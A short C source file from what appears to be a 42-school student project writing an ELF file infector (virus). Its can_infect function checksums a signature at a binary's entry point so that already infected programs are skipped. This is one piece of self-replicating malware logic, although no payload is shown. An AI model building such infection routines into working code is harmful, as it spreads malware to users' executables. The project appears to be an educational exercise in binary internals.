/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   can_infect.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/15 15:48:52 by ichkamo           #+#    #+#             */
/*   Updated: 2019/06/15 17:07:41 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"

static uint64_t	checksum(const char *buff, size_t buffsize)
{
	uint64_t	sum = 0;

	while (buffsize--)
		sum += buff[buffsize];
	return sum;
}

/*
** if current binary is already our client, don't infect again ! <3
*/

bool		can_infect(const struct entry *original_entry, \
			const struct safe_pointer info)
{
	const Elf64_Off	sh_offset        = (original_entry->safe_shdr->sh_offset);
	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
	const size_t	signature_offset = entry_offset + CALL_INSTR_SIZE + sizeof(struct client_info);
	char	 	*signature       = safe(signature_offset, SIGNATURE_LEN);

	if (!signature) return false;

	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
		return false;

	return true;
}
